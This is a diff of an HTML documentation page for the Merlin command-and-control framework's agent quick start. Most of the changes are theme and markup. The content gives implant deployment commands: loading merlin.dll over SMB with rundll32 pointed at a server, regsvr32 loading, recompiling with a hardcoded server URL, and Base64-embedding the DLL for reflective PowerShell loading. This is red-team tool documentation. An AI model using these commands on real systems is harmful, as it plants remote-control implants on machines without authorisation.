@@ -1,38 +1,204 @@
 
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
-  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 
-<html xmlns="http://www.w3.org/1999/xhtml">
-  <head>
-    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-    <title>Merlin Agent &#8212; Merlin BETA documentation</title>
-    <link rel="stylesheet" href="../_static/alabaster.css" type="text/css" />
-    <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
-    <script type="text/javascript" id="documentation_options" data-url_root="../" src="../_static/documentation_options.js"></script>
-    <script type="text/javascript" src="../_static/jquery.js"></script>
-    <script type="text/javascript" src="../_static/underscore.js"></script>
-    <script type="text/javascript" src="../_static/doctools.js"></script>
-    <script type="text/javascript" src="../_static/language_data.js"></script>
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>Merlin Agent &mdash; Merlin BETA documentation</title>
+  
+
+  
+  <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+
+  
+  
+  
+  
+
+  
+  <!--[if lt IE 9]>
+    <script src="../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+    
+      <script type="text/javascript" id="documentation_options" data-url_root="../" src="../_static/documentation_options.js"></script>
+        <script src="../_static/jquery.js"></script>
+        <script src="../_static/underscore.js"></script>
+        <script src="../_static/doctools.js"></script>
+        <script src="../_static/language_data.js"></script>
+    
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+
+    
     <link rel="index" title="Index" href="../genindex.html" />
     <link rel="search" title="Search" href="../search.html" />
     <link rel="next" title="FAQ" href="faq.html" />
-    <link rel="prev" title="Merlin Server" href="server.html" />
+    <link rel="prev" title="Merlin Server" href="server.html" /> 
+</head>
+
+<body class="wy-body-for-nav">
+
    
-  <link rel="stylesheet" href="../_static/custom.css" type="text/css" />
-  
-  
-  <meta name="viewport" content="width=device-width, initial-scale=0.9, maximum-scale=0.9" />
-
-  </head><body>
-  
-
-    <div class="document">
-      <div class="documentwrapper">
-        <div class="bodywrapper">
+  <div class="wy-grid-for-nav">
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
           
 
-          <div class="body" role="main">
+          
+            <a href="../index.html" class="icon icon-home" alt="Documentation Home"> Merlin
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                0.8.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Quick Start</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="server.html">Merlin Server</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Merlin Agent</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#upload-execute">Upload &amp; Execute</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#windows-local-command-execution">Windows Local Command Execution</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#windows-exe-cmd-exe">Windows EXE - cmd.exe</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#windows-dll-rundll32-exe">Windows DLL - rundll32.exe</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#windows-remote-command-execution">Windows Remote Command Execution</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#windows-exe-psexec-exe">Windows EXE - PsExec.exe</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#windows-dll-metasploit-s-smb-delivery">Windows DLL - Metasploit’s SMB Delivery</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#advanced">Advanced</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#recompile-dll">Recompile DLL</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#powershell-invoke-merlin-ps1">PowerShell - Invoke-Merlin.ps1</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="faq.html">FAQ</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Merlin Agent</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../agent/cli.html">Command Line Flags</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../agent/dll.html">DLL Agent</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../agent/powershell.html">PowerShell</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../agent/custom.html">Custom Build</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../agent/javascript.html">JavaScript Agent</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Merlin Server</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../server/menu/main.html">Main Menu</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../server/menu/agents.html">Agent Menu</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../server/menu/listeners.html">Listener Menu</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../server/menu/modules.html">Modules Menu</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../server/x509.html">TLS Certificates</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Modules</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../modules/build.html">Building Modules</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Misc.</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../misc/blogs.html">Blog Posts</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../misc/contrib.html">Contributing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../misc/logging.html">Logging</a></li>
+</ul>
+
+            
+          
+        </div>
+        
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">Merlin</a>
+        
+      </nav>
+
+
+      <div class="wy-nav-content">
+        
+        <div class="rst-content">
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html" class="icon icon-home"></a> &raquo;</li>
+        
+      <li>Merlin Agent</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/quickStart/agent.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
             
   <div class="section" id="merlin-agent">
 <span id="agent-quickstart"></span><h1>Merlin Agent<a class="headerlink" href="#merlin-agent" title="Permalink to this headline">¶</a></h1>
@@ -129,10 +295,10 @@ C:\&gt;rundll32.exe \\192.168.1.100\WxlV\merlin.dll,Run https://192.168.1.100:44
 <h3>Recompile DLL<a class="headerlink" href="#recompile-dll" title="Permalink to this headline">¶</a></h3>
 <p>The <cite>merlin.dll</cite> file can be configured with the hardcoded url of your Merlin server. To do this, clone the repo, modify the file, and recompile it.</p>
 <ol class="arabic simple">
-<li>Clone the merlin repository using git</li>
-<li>Edit the file at <cite>cmd/merlinagentdll/main.go</cite></li>
-<li>Find the string <cite>var url = “https://127.0.0.1:443/”</cite> and change the address</li>
-<li>Compile the DLL</li>
+<li><p>Clone the merlin repository using git</p></li>
+<li><p>Edit the file at <cite>cmd/merlinagentdll/main.go</cite></p></li>
+<li><p>Find the string <cite>var url = “https://127.0.0.1:443/”</cite> and change the address</p></li>
+<li><p>Compile the DLL</p></li>
 </ol>
 <p>example:</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cd</span> <span class="o">/</span><span class="n">opt</span>
@@ -145,14 +311,14 @@ C:\&gt;rundll32.exe \\192.168.1.100\WxlV\merlin.dll,Run https://192.168.1.100:44
 <p>This will leave the <cite>merlin.dll</cite> in the <cite>data/temp/v0.5.0/</cite> directory where <cite>v0.5.0</cite> is the current version number of Merlin. Now the recompdiled version of the DLL can be run without having to specify the address of the Merlin server.</p>
 <p>rundll32.exe examples:</p>
 <ul class="simple">
-<li><code class="docutils literal notranslate"><span class="pre">rundll32.exe</span> <span class="pre">merlin,main</span></code></li>
-<li><code class="docutils literal notranslate"><span class="pre">rundll32.exe</span> <span class="pre">merlin,Run</span></code></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">rundll32.exe</span> <span class="pre">merlin,main</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">rundll32.exe</span> <span class="pre">merlin,Run</span></code></p></li>
 </ul>
 <p>regsvr32.exe examples:</p>
 <ul class="simple">
-<li><code class="docutils literal notranslate"><span class="pre">regsvr32.exe</span> <span class="pre">/s</span> <span class="pre">merlin.dll</span></code></li>
-<li><code class="docutils literal notranslate"><span class="pre">regsvr32.exe</span> <span class="pre">/s</span> <span class="pre">/u</span> <span class="pre">merlin.dll</span></code></li>
-<li><code class="docutils literal notranslate"><span class="pre">regsvr32.exe</span> <span class="pre">/s</span> <span class="pre">/n</span> <span class="pre">/i</span> <span class="pre">merlin.dll</span></code></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">regsvr32.exe</span> <span class="pre">/s</span> <span class="pre">merlin.dll</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">regsvr32.exe</span> <span class="pre">/s</span> <span class="pre">/u</span> <span class="pre">merlin.dll</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">regsvr32.exe</span> <span class="pre">/s</span> <span class="pre">/n</span> <span class="pre">/i</span> <span class="pre">merlin.dll</span></code></p></li>
 </ul>
 </div>
 <div class="section" id="powershell-invoke-merlin-ps1">
@@ -162,15 +328,16 @@ C:\&gt;rundll32.exe \\192.168.1.100\WxlV\merlin.dll,Run https://192.168.1.100:44
 </div>
 <p>The <code class="docutils literal notranslate"><span class="pre">Invoke-Merlin.ps1</span></code> PowerShell script can be found in the <code class="docutils literal notranslate"><span class="pre">data/bin/powershell</span></code> directory. This script leverages the work done by the PowerSploit team to reflectively load  <cite>merlin.dll</cite> into memory. View the <a class="reference external" href="https://github.com/Ne0nd0g/merlin/blob/dev/data/bin/powershell/README.MD">README</a> for additional details. By default, Invoke-Merlin connects to <cite>https://127.0.0.1:443/</cite>. At the time of this writing, I have not found a way to provide an argument of the listening Merlin server’s address when calling the DLL. Therefore, this requires recompiling the DLL with the hardcoded address of the listening Merlin server as shown in the <em>Recompile DLL</em> section above. The <cite>Invoke-Merlin.ps1</cite> script needs to be updated with the Base64 encoded version of the new recompiled <cite>merlin.dll</cite> file. The quickest way to update Invoke-Merlin.ps1 is to use the set commands below from a PowerShell terminal.</p>
 <ul class="simple">
-<li>Read the DLL into a variable:</li>
+<li><p>Read the DLL into a variable:</p></li>
 </ul>
 <blockquote>
-<div><code class="docutils literal notranslate"><span class="pre">$PEBytes</span> <span class="pre">=</span> <span class="pre">[IO.File]::ReadAllBytes('C:/Go/src/Ne0nd0g/merlin/data/bin/dll/merlin.dll')</span></code></div></blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">$PEBytes</span> <span class="pre">=</span> <span class="pre">[IO.File]::ReadAllBytes('C:/Go/src/Ne0nd0g/merlin/data/bin/dll/merlin.dll')</span></code></p>
+</div></blockquote>
 <ul>
-<li><p class="first">Base64 encode the DLL and save it in another variable:</p>
+<li><p>Base64 encode the DLL and save it in another variable:</p>
 <p><code class="docutils literal notranslate"><span class="pre">$Base64String</span> <span class="pre">=</span> <span class="pre">[System.Convert]::ToBase64String($PEBytes)</span></code></p>
 </li>
-<li><p class="first">Update the existing Invoke-Merlin.ps1 script with the Base64 encoded version of the newly compiled DLL:</p>
+<li><p>Update the existing Invoke-Merlin.ps1 script with the Base64 encoded version of the newly compiled DLL:</p>
 <p><code class="docutils literal notranslate"><span class="pre">(Get-Content</span> <span class="pre">data/bin/powershell/Invoke-Merlin.ps1)</span> <span class="pre">|</span> <span class="pre">foreach-object</span> <span class="pre">{$_</span> <span class="pre">-replace</span> <span class="pre">'^\$global\:merlin</span> <span class="pre">\=</span> <span class="pre">(.*)',</span> <span class="pre">('$global:merlin</span> <span class="pre">=</span> <span class="pre">'</span> <span class="pre">+</span> <span class="pre">&quot;'&quot;</span> <span class="pre">+</span> <span class="pre">$Base64String</span> <span class="pre">+</span> <span class="pre">&quot;'&quot;)}</span> <span class="pre">|</span> <span class="pre">Set-Content</span> <span class="pre">data/bin/powershell/Invoke-Merlin.ps1</span></code></p>
 </li>
 </ul>
@@ -196,105 +363,59 @@ C:\&gt;rundll32.exe \\192.168.1.100\WxlV\merlin.dll,Run https://192.168.1.100:44
 </div>
 
 
+           </div>
+           
           </div>
-          
-        </div>
-      </div>
-      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
-        <div class="sphinxsidebarwrapper">
-<h1 class="logo"><a href="../index.html">Merlin</a></h1>
-
-
-
-
-
-
-
-
-<h3>Navigation</h3>
-<p class="caption"><span class="caption-text">Quick Start</span></p>
-<ul class="current">
-<li class="toctree-l1"><a class="reference internal" href="server.html">Merlin Server</a></li>
-<li class="toctree-l1 current"><a class="current reference internal" href="#">Merlin Agent</a><ul>
-<li class="toctree-l2"><a class="reference internal" href="#upload-execute">Upload &amp; Execute</a></li>
-<li class="toctree-l2"><a class="reference internal" href="#windows-local-command-execution">Windows Local Command Execution</a></li>
-<li class="toctree-l2"><a class="reference internal" href="#windows-remote-command-execution">Windows Remote Command Execution</a></li>
-</ul>
-</li>
-<li class="toctree-l1"><a class="reference internal" href="faq.html">FAQ</a></li>
-</ul>
-<p class="caption"><span class="caption-text">Merlin Agent</span></p>
-<ul>
-<li class="toctree-l1"><a class="reference internal" href="../agent/cli.html">Command Line Flags</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../agent/dll.html">DLL Agent</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../agent/powershell.html">PowerShell</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../agent/custom.html">Custom Build</a></li>
-</ul>
-<p class="caption"><span class="caption-text">Merlin Server</span></p>
-<ul>
-<li class="toctree-l1"><a class="reference internal" href="../server/menu/main.html">Main Menu</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../server/menu/agents.html">Agent Menu</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../server/menu/listeners.html">Listener Menu</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../server/menu/modules.html">Modules Menu</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../server/x509.html">TLS Certificates</a></li>
-</ul>
-<p class="caption"><span class="caption-text">Modules</span></p>
-<ul>
-<li class="toctree-l1"><a class="reference internal" href="../modules/build.html">Building Modules</a></li>
-</ul>
-<p class="caption"><span class="caption-text">Misc.</span></p>
-<ul>
-<li class="toctree-l1"><a class="reference internal" href="../misc/blogs.html">Blog Posts</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../misc/logging.html">Logging</a></li>
-</ul>
-
-<div class="relations">
-<h3>Related Topics</h3>
-<ul>
-  <li><a href="../index.html">Documentation overview</a><ul>
-      <li>Previous: <a href="server.html" title="previous chapter">Merlin Server</a></li>
-      <li>Next: <a href="faq.html" title="next chapter">FAQ</a></li>
-  </ul></li>
-</ul>
-</div>
-<div id="searchbox" style="display: none" role="search">
-  <h3>Quick search</h3>
-    <div class="searchformwrapper">
-    <form class="search" action="../search.html" method="get">
-      <input type="text" name="q" />
-      <input type="submit" value="Go" />
-      <input type="hidden" name="check_keywords" value="yes" />
-      <input type="hidden" name="area" value="default" />
-    </form>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="faq.html" class="btn btn-neutral float-right" title="FAQ" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="server.html" class="btn btn-neutral float-left" title="Merlin Server" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
     </div>
-</div>
-<script type="text/javascript">$('#searchbox').show(0);</script>
+  
 
+  <hr/>
 
+  <div role="contentinfo">
+    <p>
+        
+        &copy; Copyright 2020, Russel Van Tuyl (@Ne0nd0g)
 
+    </p>
+  </div>
+    
+    
+    
+    Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a
+    
+    <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a>
+    
+    provided by <a href="https://readthedocs.org">Read the Docs</a>. 
 
-
-
-
+</footer>
 
         </div>
       </div>
-      <div class="clearer"></div>
-    </div>
-    <div class="footer">
-      &copy;2020, Russel Van Tuyl (@Ne0nd0g).
-      
-      |
-      Powered by <a href="http://sphinx-doc.org/">Sphinx 1.8.5</a>
-      &amp; <a href="https://github.com/bitprophet/alabaster">Alabaster 0.7.12</a>
-      
-      |
-      <a href="../_sources/quickStart/agent.rst.txt"
-          rel="nofollow">Page source</a>
-    </div>
 
-    
+    </section>
 
+  </div>
+  
+
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script>
+
+  
+  
     
-  </body>
+   
+
+</body>
 </html>
